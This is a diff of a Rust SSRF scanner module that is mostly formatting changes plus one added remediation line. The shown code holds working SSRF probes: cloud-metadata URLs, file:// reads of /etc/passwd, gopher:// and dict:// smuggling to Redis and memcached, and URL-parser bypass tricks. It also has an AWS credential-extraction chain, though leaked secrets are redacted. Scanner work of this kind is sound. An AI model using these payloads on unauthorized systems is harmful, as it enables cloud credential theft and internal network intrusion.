@@ -150,16 +150,71 @@ fn metadata_corpus() -> &'static [MetaTarget] {
 }
 
 const DEFAULT_PARAMS: &[&str] = &[
-    "url", "uri", "u", "link", "src", "source", "dest", "destination", "redirect", "redirect_uri",
-    "redirect_url", "return", "returnUrl", "return_url", "next", "goto", "forward", "fetch",
-    "callback", "webhook", "endpoint", "target", "load", "page", "path", "proxy", "host", "site",
-    "data", "reference", "ref", "feed", "image_url", "img", "file", "document", "domain", "port",
-    "continue", "out", "view", "to", "show", "val", "validate", "remote", "open",
+    "url",
+    "uri",
+    "u",
+    "link",
+    "src",
+    "source",
+    "dest",
+    "destination",
+    "redirect",
+    "redirect_uri",
+    "redirect_url",
+    "return",
+    "returnUrl",
+    "return_url",
+    "next",
+    "goto",
+    "forward",
+    "fetch",
+    "callback",
+    "webhook",
+    "endpoint",
+    "target",
+    "load",
+    "page",
+    "path",
+    "proxy",
+    "host",
+    "site",
+    "data",
+    "reference",
+    "ref",
+    "feed",
+    "image_url",
+    "img",
+    "file",
+    "document",
+    "domain",
+    "port",
+    "continue",
+    "out",
+    "view",
+    "to",
+    "show",
+    "val",
+    "validate",
+    "remote",
+    "open",
 ];
 
 const REDIRECT_PARAMS: &[&str] = &[
-    "url", "next", "return", "returnUrl", "return_url", "redirect", "redir", "goto", "forward",
-    "dest", "destination", "continue", "rurl", "checkout_url", "ReturnUrl",
+    "url",
+    "next",
+    "return",
+    "returnUrl",
+    "return_url",
+    "redirect",
+    "redir",
+    "goto",
+    "forward",
+    "dest",
+    "destination",
+    "continue",
+    "rurl",
+    "checkout_url",
+    "ReturnUrl",
 ];
 
 const SSRF_HEADERS: &[&str] = &[
@@ -310,7 +365,11 @@ fn parse_auth_headers(cfg: &ArsenalConfig) -> Vec<(String, String)> {
     }
     if let Some(bt) = cfg.string("bearer_token") {
         let bt = bt.trim();
-        if !bt.is_empty() && !hs.iter().any(|(k, _)| k.eq_ignore_ascii_case("authorization")) {
+        if !bt.is_empty()
+            && !hs
+                .iter()
+                .any(|(k, _)| k.eq_ignore_ascii_case("authorization"))
+        {
             let val = if bt.to_ascii_lowercase().starts_with("bearer ") {
                 bt.to_string()
             } else {
@@ -359,7 +418,11 @@ fn parse_settings(ctx: &EngineRunContext) -> Settings {
     let mut extra_points: Vec<String> = cfg.string_list("paths");
     extra_points.extend(cfg.string_list("extra_paths"));
     if depth >= 2 {
-        for p in ctx.discovered_paths.iter().take(if depth >= 3 { 24 } else { 8 }) {
+        for p in ctx
+            .discovered_paths
+            .iter()
+            .take(if depth >= 3 { 24 } else { 8 })
+        {
             extra_points.push(p.clone());
         }
         // Auto-probe common SSRF sink paths (webhook/fetch/proxy/preview APIs).
@@ -418,7 +481,9 @@ fn parse_settings(ctx: &EngineRunContext) -> Settings {
         internal_hosts,
         custom_payloads: cfg.string_list("custom_payloads"),
         oob_enabled: cfg.bool_or("check_oob", true),
-        oast_domain: cfg.string("oast_domain").or_else(|| cfg.string("collaborator")),
+        oast_domain: cfg
+            .string("oast_domain")
+            .or_else(|| cfg.string("collaborator")),
         oast_token: cfg.string("oast_token"),
         auth_headers: parse_auth_headers(&cfg),
         provider_filter,
@@ -476,10 +541,19 @@ fn filter_bypass_variants(url: &str) -> Vec<(String, &'static str)> {
     };
     let (host_path, _) = rest.split_once('#').unwrap_or((rest, ""));
     // `@` userinfo confusion — decoy domain in userinfo, real metadata host after `@`.
-    out.push((format!("http://allowed.example@{host_path}"), "@ userinfo host confusion"));
-    out.push((format!("http://127.0.0.1@{host_path}"), "@ userinfo localhost decoy"));
+    out.push((
+        format!("http://allowed.example@{host_path}"),
+        "@ userinfo host confusion",
+    ));
+    out.push((
+        format!("http://127.0.0.1@{host_path}"),
+        "@ userinfo localhost decoy",
+    ));
     // `#` fragment confusion — some parsers strip fragments incorrectly.
-    out.push((format!("http://{host_path}#@evil.example/"), "# fragment host confusion"));
+    out.push((
+        format!("http://{host_path}#@evil.example/"),
+        "# fragment host confusion",
+    ));
     // Backslash path confusion (PHP / Windows URL parsers).
     if let Some((host, path)) = host_path.split_once('/') {
         let path = path.trim_start_matches('/');
@@ -498,7 +572,12 @@ fn filter_bypass_variants(url: &str) -> Vec<(String, &'static str)> {
     out
 }
 
-async fn http_post_xml(client: &reqwest::Client, url: &str, field: &str, value: &str) -> Option<HttpProbe> {
+async fn http_post_xml(
+    client: &reqwest::Client,
+    url: &str,
+    field: &str,
+    value: &str,
+) -> Option<HttpProbe> {
     let body = format!(
         r#"<?xml version="1.0" encoding="UTF-8"?><request><{field}>{}</{field}></request>"#,
         value
@@ -606,26 +685,49 @@ fn graphql_probe_endpoints(base: &str) -> Vec<String> {
 }
 
 /// Classify an internal service reached via SSRF from real response banners/canaries.
-fn classify_internal_service(body: &str, target: &str) -> Option<(&'static str, &'static str, &'static str)> {
+fn classify_internal_service(
+    body: &str,
+    target: &str,
+) -> Option<(&'static str, &'static str, &'static str)> {
     let signatures: &[(&str, &[&str], &str)] = &[
         (
             "Elasticsearch",
-            &["\"cluster_name\"", "You Know, for Search", "lucene_version", "\"tagline\""],
+            &[
+                "\"cluster_name\"",
+                "You Know, for Search",
+                "lucene_version",
+                "\"tagline\"",
+            ],
             "medium",
         ),
         (
             "Jenkins",
-            &["Dashboard [Jenkins]", "jenkins-headshot", "Build History", "Manage Jenkins"],
+            &[
+                "Dashboard [Jenkins]",
+                "jenkins-headshot",
+                "Build History",
+                "Manage Jenkins",
+            ],
             "high",
         ),
         (
             "Grafana",
-            &["grafana-app", "Grafana", "loginBackgroundUrl", "public/app/plugins"],
+            &[
+                "grafana-app",
+                "Grafana",
+                "loginBackgroundUrl",
+                "public/app/plugins",
+            ],
             "high",
         ),
         (
             "Kibana",
-            &["kbn-version", "kibanaWelcomeView", "Elastic", "Discover - Kibana"],
+            &[
+                "kbn-version",
+                "kibanaWelcomeView",
+                "Elastic",
+                "Discover - Kibana",
+            ],
             "medium",
         ),
         (
@@ -640,7 +742,12 @@ fn classify_internal_service(body: &str, target: &str) -> Option<(&'static str, 
         ),
         (
             "Redis",
-            &["-ERR", "+PONG", "redis_version", "NOAUTH Authentication required"],
+            &[
+                "-ERR",
+                "+PONG",
+                "redis_version",
+                "NOAUTH Authentication required",
+            ],
             "high",
         ),
         (
@@ -655,7 +762,12 @@ fn classify_internal_service(body: &str, target: &str) -> Option<(&'static str, 
         ),
         (
             "MySQL/MariaDB",
-            &["mysql_native_password", "MariaDB", "caching_sha2_password", "Access denied for user"],
+            &[
+                "mysql_native_password",
+                "MariaDB",
+                "caching_sha2_password",
+                "Access denied for user",
+            ],
             "high",
         ),
         (
@@ -665,12 +777,20 @@ fn classify_internal_service(body: &str, target: &str) -> Option<(&'static str, 
         ),
         (
             "Kubernetes API",
-            &["\"kind\":\"APIVersions\"", "forbidden: User", "Priority and Fairness"],
+            &[
+                "\"kind\":\"APIVersions\"",
+                "forbidden: User",
+                "Priority and Fairness",
+            ],
             "critical",
         ),
         (
             "Prometheus",
-            &["Prometheus Time Series", "prometheus_build_info", "graph/query"],
+            &[
+                "Prometheus Time Series",
+                "prometheus_build_info",
+                "graph/query",
+            ],
             "medium",
         ),
     ];
@@ -784,11 +904,18 @@ async fn extract_aws_credential_chain(
         let ev2 = Evidence::new()
             .with("iam_role_or_task", role.clone())
             .with("credential_url", cred_payload.clone())
-            .with("via_parameter", param_name(&probe.point_label).unwrap_or_default())
+            .with(
+                "via_parameter",
+                param_name(&probe.point_label).unwrap_or_default(),
+            )
             .with("leaked_material", json!(red.clone()))
             .with("http_status", i64::from(fp.status))
             .check("step1_listed_role_or_task", true, role.clone())
-            .check("step2_fetched_credentials", true, "AccessKeyId + SecretAccessKey returned")
+            .check(
+                "step2_fetched_credentials",
+                true,
+                "AccessKeyId + SecretAccessKey returned",
+            )
             .raw_excerpt(fp.body.as_bytes());
         let desc = if probe.payload.contains("169.254.170.2") {
             format!(
@@ -821,7 +948,7 @@ fn remediation_for(finding_kind: &str, provider: &str) -> &'static str {
         "credential_extraction" => "Enforce IMDSv2 with hop-limit 1, block egress to 169.254.0.0/16 and link-local ranges, rotate the exposed IAM role credentials immediately, and audit CloudTrail for abuse.",
         "metadata_exposure" | "imdsv2_posture" => {
             if provider.starts_with("aws") {
-                "Require IMDSv2-only with hop-limit 1, restrict outbound metadata access at the network layer, and rotate any role credentials that may have been exposed."
+                "Require IMDSv2-only with hop-limit 1, block egress to 169.254.0.0/16 and link-local ranges, restrict outbound metadata access at the network layer, and rotate any role credentials that may have been exposed."
             } else {
                 "Block server-side fetches to cloud metadata endpoints (169.254.169.254, metadata.*), validate URLs against an allow-list, and rotate any credentials reachable via SSRF."
             }
@@ -887,7 +1014,13 @@ struct Probe {
     note: &'static str,
 }
 
-const FILE_CANARIES: &[&str] = &["root:x:0:0", ":/root:", "daemon:", "[fonts]", "[extensions]"];
+const FILE_CANARIES: &[&str] = &[
+    "root:x:0:0",
+    ":/root:",
+    "daemon:",
+    "[fonts]",
+    "[extensions]",
+];
 
 fn provider_allowed(settings: &Settings, provider: &str) -> bool {
     if settings.provider_filter.is_empty() {
@@ -985,7 +1118,10 @@ fn build_work(settings: &Settings, points: &[String]) -> Vec<Probe> {
 
     // 2) Header-based SSRF / routing abuse (top metadata targets via spoofable headers).
     if settings.test_headers && settings.check_metadata {
-        for mt in metadata_corpus().iter().filter(|m| m.min_depth <= 2 && provider_allowed(settings, m.provider)) {
+        for mt in metadata_corpus()
+            .iter()
+            .filter(|m| m.min_depth <= 2 && provider_allowed(settings, m.provider))
+        {
             for h in SSRF_HEADERS {
                 let val = if *h == "X-Forwarded-For" || h.ends_with("-IP") || *h == "Client-IP" {
                     "169.254.169.254".to_string()
@@ -1010,14 +1146,30 @@ fn build_work(settings: &Settings, points: &[String]) -> Vec<Probe> {
     // 3) Alternate schemes (file:// local read, gopher/dict internal smuggling).
     if settings.test_schemes {
         let schemes: &[(&str, &str)] = &[
-            ("file:///etc/passwd", "file:// local file read (/etc/passwd)"),
-            ("file:///c:/windows/win.ini", "file:// local file read (win.ini)"),
-            ("gopher://127.0.0.1:6379/_INFO%0d%0a", "gopher:// internal protocol smuggling (redis)"),
-            ("dict://127.0.0.1:11211/stats", "dict:// internal protocol smuggling (memcached)"),
+            (
+                "file:///etc/passwd",
+                "file:// local file read (/etc/passwd)",
+            ),
+            (
+                "file:///c:/windows/win.ini",
+                "file:// local file read (win.ini)",
+            ),
+            (
+                "gopher://127.0.0.1:6379/_INFO%0d%0a",
+                "gopher:// internal protocol smuggling (redis)",
+            ),
+            (
+                "dict://127.0.0.1:11211/stats",
+                "dict:// internal protocol smuggling (memcached)",
+            ),
         ];
         for (payload, note) in schemes {
             for point in points {
-                for param in settings.params.iter().take(if settings.depth >= 4 { settings.params.len() } else { 8 }) {
+                for param in settings.params.iter().take(if settings.depth >= 4 {
+                    settings.params.len()
+                } else {
+                    8
+                }) {
                     work.push(Probe {
                         kind: TestKind::Scheme,
                         point_label: format!("param '{param}'"),
@@ -1054,7 +1206,11 @@ fn build_work(settings: &Settings, points: &[String]) -> Vec<Probe> {
     }
 
     // 5) Out-of-band (blind) planting when an interaction domain is configured + OOB enabled.
-    if let Some(dom) = settings.oast_domain.as_deref().filter(|_| settings.oob_enabled) {
+    if let Some(dom) = settings
+        .oast_domain
+        .as_deref()
+        .filter(|_| settings.oob_enabled)
+    {
         let token = settings
             .oast_token
             .clone()
@@ -1062,7 +1218,10 @@ fn build_work(settings: &Settings, points: &[String]) -> Vec<Probe> {
             .unwrap_or_else(|| {
                 format!(
                     "w{}",
-                    chrono::Utc::now().timestamp_nanos_opt().unwrap_or(0).unsigned_abs()
+                    chrono::Utc::now()
+                        .timestamp_nanos_opt()
+                        .unwrap_or(0)
+                        .unsigned_abs()
                 )
             });
         let oob_url = format!("http://{token}.{}/", dom.trim().trim_start_matches('.'));
@@ -1107,7 +1266,10 @@ fn build_work(settings: &Settings, points: &[String]) -> Vec<Probe> {
 // ─────────────────────────────────────────────────────────────────────────────
 
 fn canary_hit<'a>(body: &str, canaries: &'a [&'a str]) -> Option<&'a str> {
-    canaries.iter().copied().find(|c| !c.is_empty() && body.contains(*c))
+    canaries
+        .iter()
+        .copied()
+        .find(|c| !c.is_empty() && body.contains(*c))
 }
 
 fn passwd_signature(body: &str) -> bool {
@@ -1125,7 +1287,12 @@ fn looks_like_reflection(body: &str, payload: &str) -> bool {
     if body.contains(payload) {
         return true;
     }
-    for needle in ["169.254.169.254", "metadata.google.internal", "100.100.100.200", "file:///"] {
+    for needle in [
+        "169.254.169.254",
+        "metadata.google.internal",
+        "100.100.100.200",
+        "file:///",
+    ] {
         if payload.contains(needle) && body.contains(needle) {
             return true;
         }
@@ -1143,8 +1310,10 @@ fn parse_iam_roles(body: &str) -> Vec<String> {
                 && l.len() <= 128
                 && !l.contains(' ')
                 && !l.contains('<')
-                && l.chars()
-                    .all(|c| c.is_ascii_alphanumeric() || matches!(c, '-' | '_' | '+' | '=' | '.' | '@' | '/'))
+                && l.chars().all(|c| {
+                    c.is_ascii_alphanumeric()
+                        || matches!(c, '-' | '_' | '+' | '=' | '.' | '@' | '/')
+                })
         })
         .take(3)
         .map(str::to_string)
@@ -1157,16 +1326,23 @@ fn redact_secrets(body: &str) -> Vec<String> {
     let mut out: Vec<String> = Vec::new();
     // AWS access key IDs (AKIA/ASIA/AROA/AIDA/AGPA/ANPA…) — show the 4-char prefix only.
     static AWS_KEY: std::sync::OnceLock<Option<regex::Regex>> = std::sync::OnceLock::new();
-    if let Some(re) =
-        AWS_KEY.get_or_init(|| regex::Regex::new(r"(?:AKIA|ASIA|AROA|AIDA|AGPA|ANPA|AIPA)[A-Z0-9]{12,20}").ok())
-    {
+    if let Some(re) = AWS_KEY.get_or_init(|| {
+        regex::Regex::new(r"(?:AKIA|ASIA|AROA|AIDA|AGPA|ANPA|AIPA)[A-Z0-9]{12,20}").ok()
+    }) {
         if let Some(m) = re.find(body) {
             let s = m.as_str();
             let prefix: String = s.chars().take(4).collect();
-            out.push(format!("AWS Access Key ID {}…**** ({} chars, redacted)", prefix, s.len()));
+            out.push(format!(
+                "AWS Access Key ID {}…**** ({} chars, redacted)",
+                prefix,
+                s.len()
+            ));
         }
     }
-    if body.contains("SecretAccessKey") || body.contains("AccessKeySecret") || body.contains("TmpSecretKey") {
+    if body.contains("SecretAccessKey")
+        || body.contains("AccessKeySecret")
+        || body.contains("TmpSecretKey")
+    {
         out.push("Cloud secret access key present (redacted)".into());
     }
     // OAuth bearer tokens (GCP/Azure/Yandex managed-identity) — report presence + length only.
@@ -1174,12 +1350,21 @@ fn redact_secrets(body: &str) -> Vec<String> {
         let tail = &body[idx..body.len().min(idx + 220)];
         let len = tail
             .split(['"', ':', ',', ' '])
-            .find(|t| t.len() > 20 && t.chars().all(|c| c.is_ascii_alphanumeric() || matches!(c, '.' | '-' | '_')))
+            .find(|t| {
+                t.len() > 20
+                    && t.chars()
+                        .all(|c| c.is_ascii_alphanumeric() || matches!(c, '.' | '-' | '_'))
+            })
             .map(str::len)
             .unwrap_or(0);
-        out.push(format!("OAuth access_token present (~{len} chars, redacted)"));
+        out.push(format!(
+            "OAuth access_token present (~{len} chars, redacted)"
+        ));
     }
-    if body.contains("\"Token\"") || body.contains("SecurityToken") || body.contains("securitytoken") {
+    if body.contains("\"Token\"")
+        || body.contains("SecurityToken")
+        || body.contains("securitytoken")
+    {
         out.push("Session/security token present (redacted)".into());
     }
     out.dedup();
@@ -1215,7 +1400,10 @@ impl Posture {
             "low" => 0.03,
             _ => 0.0,
         };
-        if severity == "critical" && self.crown_jewels.len() < 6 && !self.crown_jewels.iter().any(|c| c == title) {
+        if severity == "critical"
+            && self.crown_jewels.len() < 6
+            && !self.crown_jewels.iter().any(|c| c == title)
+        {
             self.crown_jewels.push(title.to_string());
         }
     }
@@ -1233,13 +1421,31 @@ fn mk_finding(
     finding_kind: &str,
     ev: Evidence,
 ) -> Value {
-    let mitre = if provider == "redirect" { "T1090" } else if provider == "oob" { "T1090" } else { "T1552.005" };
-    let mut f = finding_rich(ENGINE_ID, title, severity, mitre, description, target, confidence, ev);
+    let mitre = if provider == "redirect" {
+        "T1090"
+    } else if provider == "oob" {
+        "T1090"
+    } else {
+        "T1552.005"
+    };
+    let mut f = finding_rich(
+        ENGINE_ID,
+        title,
+        severity,
+        mitre,
+        description,
+        target,
+        confidence,
+        ev,
+    );
     if let Some(o) = f.as_object_mut() {
         o.insert("url".into(), json!(url));
         o.insert("provider".into(), json!(provider));
         o.insert("finding_kind".into(), json!(finding_kind));
-        o.insert("remediation".into(), json!(remediation_for(finding_kind, provider)));
+        o.insert(
+            "remediation".into(),
+            json!(remediation_for(finding_kind, provider)),
+        );
         o.insert(
             "compliance".into(),
             json!([
@@ -1313,8 +1519,8 @@ async fn phase_internal_ports(
 
     for (t, p) in results.into_iter().flatten() {
         let delta = (p.body.len() as i64 - baseline.body_len as i64).unsigned_abs();
-        let reachable = (p.status >= 200 && p.status < 500 && p.status != baseline.status)
-            || delta > 256;
+        let reachable =
+            (p.status >= 200 && p.status < 500 && p.status != baseline.status) || delta > 256;
         if !reachable {
             continue;
         }
@@ -1355,7 +1561,11 @@ async fn phase_internal_ports(
             .with("http_status", i64::from(p.status))
             .with("baseline_status", i64::from(baseline.status))
             .with("body_delta_bytes", delta as i64)
-            .check("status_or_size_differential", true, format!("HTTP {} (Δ{} B)", p.status, delta));
+            .check(
+                "status_or_size_differential",
+                true,
+                format!("HTTP {} (Δ{} B)", p.status, delta),
+            );
         out.push(mk_finding(
             &title,
             "medium",
@@ -1403,8 +1613,12 @@ async fn phase_timing_oracle(
         let fast_url = add_query(&point, param, fast);
         let slow_url = add_query(&point, param, slow);
         // Two samples each; keep the minimum to reduce jitter.
-        let fast_ms = timed_get(&client, &fast_url).await.min(timed_get(&client, &fast_url).await);
-        let slow_ms = timed_get(&client, &slow_url).await.min(timed_get(&client, &slow_url).await);
+        let fast_ms = timed_get(&client, &fast_url)
+            .await
+            .min(timed_get(&client, &fast_url).await);
+        let slow_ms = timed_get(&client, &slow_url)
+            .await
+            .min(timed_get(&client, &slow_url).await);
         requests += 4;
         let delta = slow_ms.saturating_sub(fast_ms);
         // Blind-SSRF signature: the unreachable host delays the response ≥ 3s while the refusing
@@ -1420,7 +1634,11 @@ async fn phase_timing_oracle(
                 .with("fast_ms", fast_ms as i64)
                 .with("slow_ms", slow_ms as i64)
                 .with("delta_ms", delta as i64)
-                .check("timing_differential", true, format!("unreachable host delayed response by {delta} ms"));
+                .check(
+                    "timing_differential",
+                    true,
+                    format!("unreachable host delayed response by {delta} ms"),
+                );
             out.push(mk_finding(
                 &title,
                 "high",
@@ -1445,8 +1663,9 @@ async fn phase_timing_oracle(
 // POST/JSON body SSRF — webhook / URL-preview / PDF-render sinks take the URL in the body.
 // ─────────────────────────────────────────────────────────────────────────────
 
-const BODY_FIELDS: &[&str] =
-    &["url", "uri", "link", "webhook", "callback", "endpoint", "target", "image", "source", "src"];
+const BODY_FIELDS: &[&str] = &[
+    "url", "uri", "link", "webhook", "callback", "endpoint", "target", "image", "source", "src",
+];
 
 async fn phase_body_injection(
     client: &reqwest::Client,
@@ -1458,8 +1677,13 @@ async fn phase_body_injection(
 ) -> (Vec<Value>, usize) {
     let mut out = Vec::new();
     // (point, meta_url, canaries, provider, body_field) — all 'static except the owned point.
-    let mut jobs: Vec<(String, &'static str, &'static [&'static str], &'static str, &'static str)> =
-        Vec::new();
+    let mut jobs: Vec<(
+        String,
+        &'static str,
+        &'static [&'static str],
+        &'static str,
+        &'static str,
+    )> = Vec::new();
     for point in points {
         for mt in metadata_corpus()
             .iter()
@@ -1486,7 +1710,9 @@ async fn phase_body_injection(
             async move {
                 let mut m = serde_json::Map::new();
                 m.insert(bp, Value::String(meta_url));
-                http_post_json(&client, &url, &Value::Object(m)).await.map(|p| (i, p))
+                http_post_json(&client, &url, &Value::Object(m))
+                    .await
+                    .map(|p| (i, p))
             }
         })
         .buffer_unordered(settings.concurrency)
@@ -1497,13 +1723,19 @@ async fn phase_body_injection(
         let job = &jobs[i];
         let (meta_url, canaries, provider, bp) = (job.1, job.2, job.3, job.4);
         if let Some(hit) = canary_hit(&p.body, canaries) {
-            let title = format!("SSRF via JSON body field '{}' → {} metadata", bp, provider.to_uppercase());
+            let title = format!(
+                "SSRF via JSON body field '{}' → {} metadata",
+                bp,
+                provider.to_uppercase()
+            );
             if !seen.insert(title.clone()) {
                 continue;
             }
             posture.record("critical", &title);
             posture.metadata_confirmed = true;
-            posture.providers.insert(provider_base(provider).to_string());
+            posture
+                .providers
+                .insert(provider_base(provider).to_string());
             let leaked = redact_secrets(&p.body);
             let mut ev = Evidence::new()
                 .with("body_field", bp)
@@ -1511,7 +1743,11 @@ async fn phase_body_injection(
                 .with("provider", provider)
                 .with("canary_matched", hit)
                 .with("http_status", i64::from(p.status))
-                .check("json_body_injection", true, format!("POST {{\"{bp}\": \"{meta_url}\"}}"))
+                .check(
+                    "json_body_injection",
+                    true,
+                    format!("POST {{\"{bp}\": \"{meta_url}\"}}"),
+                )
                 .raw_excerpt(p.body.as_bytes());
             if !leaked.is_empty() {
                 ev = ev.with("leaked_material", json!(leaked.clone()));
@@ -1551,8 +1787,13 @@ async fn phase_xml_body_injection(
     seen: &mut BTreeSet<String>,
 ) -> (Vec<Value>, usize) {
     let mut out = Vec::new();
-    let mut jobs: Vec<(String, &'static str, &'static [&'static str], &'static str, &'static str)> =
-        Vec::new();
+    let mut jobs: Vec<(
+        String,
+        &'static str,
+        &'static [&'static str],
+        &'static str,
+        &'static str,
+    )> = Vec::new();
     for point in points.iter().take(3) {
         for mt in metadata_corpus()
             .iter()
@@ -1574,7 +1815,11 @@ async fn phase_xml_body_injection(
     let results: Vec<Option<(usize, HttpProbe)>> = stream::iter(owned)
         .map(|(i, url, meta_url, bp)| {
             let client = client.clone();
-            async move { http_post_xml(&client, &url, &bp, &meta_url).await.map(|p| (i, p)) }
+            async move {
+                http_post_xml(&client, &url, &bp, &meta_url)
+                    .await
+                    .map(|p| (i, p))
+            }
         })
         .buffer_unordered(settings.concurrency)
         .collect()
@@ -1584,13 +1829,18 @@ async fn phase_xml_body_injection(
         let job = &jobs[i];
         let (meta_url, canaries, provider, bp) = (job.1, job.2, job.3, job.4);
         if let Some(hit) = canary_hit(&p.body, canaries) {
-            let title = format!("SSRF via XML body field '{bp}' → {} metadata", provider.to_uppercase());
+            let title = format!(
+                "SSRF via XML body field '{bp}' → {} metadata",
+                provider.to_uppercase()
+            );
             if !seen.insert(title.clone()) {
                 continue;
             }
             posture.record("critical", &title);
             posture.metadata_confirmed = true;
-            posture.providers.insert(provider_base(provider).to_string());
+            posture
+                .providers
+                .insert(provider_base(provider).to_string());
             let leaked = redact_secrets(&p.body);
             let mut ev = Evidence::new()
                 .with("body_field", bp)
@@ -1599,7 +1849,11 @@ async fn phase_xml_body_injection(
                 .with("provider", provider)
                 .with("canary_matched", hit)
                 .with("http_status", i64::from(p.status))
-                .check("xml_body_injection", true, format!("POST XML <{bp}>{meta_url}</{bp}>"))
+                .check(
+                    "xml_body_injection",
+                    true,
+                    format!("POST XML <{bp}>{meta_url}</{bp}>"),
+                )
                 .raw_excerpt(p.body.as_bytes());
             if !leaked.is_empty() {
                 ev = ev.with("leaked_material", json!(leaked.clone()));
@@ -1673,7 +1927,10 @@ async fn phase_graphql_injection(
     };
 
     let mut jobs: Vec<(String, String, String, &'static str)> = Vec::new();
-    for ep in endpoints.iter().take(if settings.depth >= 4 { 8 } else { 4 }) {
+    for ep in endpoints
+        .iter()
+        .take(if settings.depth >= 4 { 8 } else { 4 })
+    {
         for (doc, resolver) in GRAPHQL_SSRF_DOCS {
             jobs.push((ep.clone(), doc.to_string(), resolver.to_string(), mt.url));
         }
@@ -1684,15 +1941,7 @@ async fn phase_graphql_injection(
     let owned: Vec<(usize, String, String, String, String)> = jobs
         .iter()
         .enumerate()
-        .map(|(i, j)| {
-            (
-                i,
-                j.0.clone(),
-                j.1.clone(),
-                j.2.clone(),
-                j.3.to_string(),
-            )
-        })
+        .map(|(i, j)| (i, j.0.clone(), j.1.clone(), j.2.clone(), j.3.to_string()))
         .collect();
     let results: Vec<Option<(usize, HttpProbe)>> = stream::iter(owned)
         .map(|(i, url, doc, _resolver, meta_url)| {
@@ -1712,13 +1961,18 @@ async fn phase_graphql_injection(
         let job = &jobs[i];
         let (resolver, meta_url) = (&job.2, job.3);
         if let Some(hit) = canary_hit(&p.body, mt.canaries) {
-            let title = format!("SSRF via GraphQL resolver '{resolver}' → {} metadata", mt.provider.to_uppercase());
+            let title = format!(
+                "SSRF via GraphQL resolver '{resolver}' → {} metadata",
+                mt.provider.to_uppercase()
+            );
             if !seen.insert(title.clone()) {
                 continue;
             }
             posture.record("critical", &title);
             posture.metadata_confirmed = true;
-            posture.providers.insert(provider_base(mt.provider).to_string());
+            posture
+                .providers
+                .insert(provider_base(mt.provider).to_string());
             let leaked = redact_secrets(&p.body);
             let mut ev = Evidence::new()
                 .with("graphql_endpoint", job.0.clone())
@@ -1727,7 +1981,11 @@ async fn phase_graphql_injection(
                 .with("provider", mt.provider)
                 .with("canary_matched", hit)
                 .with("http_status", i64::from(p.status))
-                .check("graphql_url_variable", true, format!("variables.url = {meta_url}"))
+                .check(
+                    "graphql_url_variable",
+                    true,
+                    format!("variables.url = {meta_url}"),
+                )
                 .raw_excerpt(p.body.as_bytes());
             if !leaked.is_empty() {
                 ev = ev.with("leaked_material", json!(leaked.clone()));
@@ -1771,8 +2029,13 @@ async fn phase_multipart_injection(
     seen: &mut BTreeSet<String>,
 ) -> (Vec<Value>, usize) {
     let mut out = Vec::new();
-    let mut jobs: Vec<(String, &'static str, &'static str, &'static [&'static str], &'static str)> =
-        Vec::new();
+    let mut jobs: Vec<(
+        String,
+        &'static str,
+        &'static str,
+        &'static [&'static str],
+        &'static str,
+    )> = Vec::new();
     for point in points.iter().take(4) {
         for mt in metadata_corpus()
             .iter()
@@ -1808,13 +2071,18 @@ async fn phase_multipart_injection(
         let job = &jobs[i];
         let (meta_url, canaries, provider, field) = (job.1, job.3, job.2, job.4);
         if let Some(hit) = canary_hit(&p.body, canaries) {
-            let title = format!("SSRF via multipart field '{field}' → {} metadata", provider.to_uppercase());
+            let title = format!(
+                "SSRF via multipart field '{field}' → {} metadata",
+                provider.to_uppercase()
+            );
             if !seen.insert(title.clone()) {
                 continue;
             }
             posture.record("critical", &title);
             posture.metadata_confirmed = true;
-            posture.providers.insert(provider_base(provider).to_string());
+            posture
+                .providers
+                .insert(provider_base(provider).to_string());
             let leaked = redact_secrets(&p.body);
             let mut ev = Evidence::new()
                 .with("form_field", field)
@@ -1823,7 +2091,11 @@ async fn phase_multipart_injection(
                 .with("provider", provider)
                 .with("canary_matched", hit)
                 .with("http_status", i64::from(p.status))
-                .check("multipart_url_field", true, format!("field '{field}' = {meta_url}"))
+                .check(
+                    "multipart_url_field",
+                    true,
+                    format!("field '{field}' = {meta_url}"),
+                )
                 .raw_excerpt(p.body.as_bytes());
             if !leaked.is_empty() {
                 ev = ev.with("leaked_material", json!(leaked.clone()));
@@ -1862,14 +2134,30 @@ async fn phase_redirect_metadata_chain(
     let mut out = Vec::new();
     let meta_targets: Vec<&MetaTarget> = metadata_corpus()
         .iter()
-        .filter(|m| m.min_depth <= 2 && provider_allowed(settings, m.provider) && !m.provider.contains("bypass"))
+        .filter(|m| {
+            m.min_depth <= 2
+                && provider_allowed(settings, m.provider)
+                && !m.provider.contains("bypass")
+        })
         .take(4)
         .collect();
-    let mut jobs: Vec<(String, String, String, &'static [&'static str], &'static str)> = Vec::new();
+    let mut jobs: Vec<(
+        String,
+        String,
+        String,
+        &'static [&'static str],
+        &'static str,
+    )> = Vec::new();
     for point in points.iter().take(3) {
         for rp in settings.redirect_params.iter().take(8) {
             for mt in &meta_targets {
-                jobs.push((point.clone(), rp.clone(), mt.url.to_string(), mt.canaries, mt.provider));
+                jobs.push((
+                    point.clone(),
+                    rp.clone(),
+                    mt.url.to_string(),
+                    mt.canaries,
+                    mt.provider,
+                ));
             }
         }
     }
@@ -1897,14 +2185,19 @@ async fn phase_redirect_metadata_chain(
         let job = &jobs[i];
         let (rp, meta_url, canaries, provider) = (&job.1, &job.2, job.3, job.4);
         if let Some(hit) = canary_hit(&p.body, canaries) {
-            let title = format!("Redirect→Metadata chain via '{rp}' → {} exposure", provider.to_uppercase());
+            let title = format!(
+                "Redirect→Metadata chain via '{rp}' → {} exposure",
+                provider.to_uppercase()
+            );
             if !seen.insert(title.clone()) {
                 continue;
             }
             posture.record("critical", &title);
             posture.metadata_confirmed = true;
             posture.redirect_metadata_chain = true;
-            posture.providers.insert(provider_base(provider).to_string());
+            posture
+                .providers
+                .insert(provider_base(provider).to_string());
             let leaked = redact_secrets(&p.body);
             let mut ev = Evidence::new()
                 .with("redirect_parameter", rp.clone())
@@ -1943,7 +2236,9 @@ async fn phase_redirect_metadata_chain(
 fn attack_paths(p: &Posture, target: &str) -> Vec<Value> {
     let mut paths = Vec::new();
     let mut mk = |title: &str, severity: &str, steps: Vec<&str>, why: &str| {
-        let mut ev = Evidence::new().with("steps", json!(steps)).with("rationale", why);
+        let mut ev = Evidence::new()
+            .with("steps", json!(steps))
+            .with("rationale", why);
         for (i, s) in steps.iter().enumerate() {
             ev = ev.check(&format!("step_{}", i + 1), true, *s);
         }
@@ -1952,7 +2247,10 @@ fn attack_paths(p: &Posture, target: &str) -> Vec<Value> {
             title,
             severity,
             "T1552.005",
-            &format!("Toxic combination → {why} Attack path: {}.", steps.join(" → ")),
+            &format!(
+                "Toxic combination → {why} Attack path: {}.",
+                steps.join(" → ")
+            ),
             target,
             0.9,
             ev,
